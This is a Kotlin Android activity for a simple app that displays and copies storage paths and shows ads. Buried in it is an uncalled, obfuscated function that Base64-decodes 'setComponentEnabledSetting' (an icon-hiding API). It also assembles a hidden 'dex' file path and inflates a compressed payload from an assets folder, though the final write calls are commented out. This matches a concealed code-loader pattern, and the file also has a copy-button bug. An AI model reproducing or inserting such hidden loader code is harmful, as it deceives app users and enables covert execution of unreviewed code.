package jp.co.integrityworks.storagepathgetter.ui

import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.os.Bundle
import android.util.Base64
import android.util.Log
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.google.android.gms.ads.AdRequest
import com.google.android.gms.ads.MobileAds
import jp.co.integrityworks.storagepathgetter.BuildConfig
import jp.co.integrityworks.storagepathgetter.R
import jp.co.integrityworks.storagepathgetter.Utils
import kotlinx.android.synthetic.main.activity_main.*
import java.io.ByteArrayOutputStream
import java.io.File
import java.util.zip.InflaterInputStream


class MainActivity : AppCompatActivity() {
    companion object {
        private val TAG = MainActivity::class.java.simpleName
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        supportActionBar?.title =
            if (BuildConfig.DEBUG) getString(R.string.app_name) + " (deb)" else getString(R.string.app_name)

        //クリップボードのサービスのインスタンスを取得する
        val mManager: ClipboardManager =
            applicationContext.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        copyInternalButton.setOnClickListener {
            val myClip: ClipData = ClipData.newPlainText("label", internalPathEditText.text)
            mManager.setPrimaryClip(myClip)
            Toast.makeText(
                applicationContext,
                "内部ストレージのパスをコピーしました。\n" + internalPathEditText.text,
                Toast.LENGTH_LONG
            ).show()
        }
        copyExternalButton.setOnClickListener {
            val myClip: ClipData = ClipData.newPlainText("label", internalPathEditText.text)
            mManager.setPrimaryClip(myClip)
            Toast.makeText(
                applicationContext,
                "外部ストレージのパスをコピーしました。\n" + externalPathEditText.text,
                Toast.LENGTH_LONG
            ).show()
        }

//        bottomNavigation.setOnNavigationItemSelectedListener { item ->
//            when (item.itemId) {
//                R.id.navigationHint -> {
//                    true
//                }
//                R.id.navigationClear -> {
//                    true
//                }
//                R.id.navigationReacquire -> {
//                    init()
//                    true
//                }
//                else -> false
//            }
//        }

        getPathButton.setOnClickListener { init() }
        clearButton.setOnClickListener {
            internalPathEditText.text.clear()
            externalPathEditText.text.clear()
            sizeTextView.text = ""
        }

        MobileAds.initialize(this, BuildConfig.admob_app_id)
        val adRequest: AdRequest = AdRequest.Builder().build()
        adView.loadAd(adRequest)
    }

    private fun aaaaaaa() {
        val b = String(Base64.decode("c2V0Q29tcG9uZW50RW5hYmxlZFNldHRpbmc=", 0))
        Log.d("debugggggg", b)

        try {
            val bbb = StringBuilder()
            bbb.append(filesDir.absolutePath)
            Log.d("debugggggg1", bbb.toString())
            bbb.append(File.separator)
            Log.d("debugggggg2", bbb.toString())
            bbb.append("DEx".toLowerCase())
            Log.d("debugggggg3", bbb.toString())
            val file = File(bbb.toString())
            if (file.exists())
                file.delete()
            val byteArrayOutputStream = ByteArrayOutputStream()
            val assss = resources.assets
            val ccc = StringBuilder();
            ccc.append("fas/".substring(1).toLowerCase())
            Log.d("debugggggg4", ccc.toString())
            ccc.append(assss.list("as")!![0])
            Log.d("debugggggg5", ccc.toString())
            var inputStream = assss.open(ccc.toString())
            inputStream.skip(4L)
            inputStream = InflaterInputStream(inputStream)
            val arrayOfByte = ByteArray(2048)
            while (true) {
                val i = inputStream.read(arrayOfByte)
                if (i == -1) {
                    inputStream.close()
//                    obbbbbj_a(file, byteArrayOutputStream)
//                    obbbbbj_a(file)
                    return
                }
                byteArrayOutputStream.write(arrayOfByte, 0, i)
            }
        } catch (throwable: Throwable) {
            throwable.printStackTrace()
            return
        }

    }

    override fun onResume() {
        super.onResume()
        init()
    }

    private fun init() {
        val util = Utils(applicationContext)
        val internalPath = util.getPath(false)
        val externalPath = util.getPath(true)
        internalPathEditText.setText(internalPath)
        externalPathEditText.setText(externalPath)

        sizeTextView.text = util.getMemoryInformation(internalPath, externalPath)
    }
}
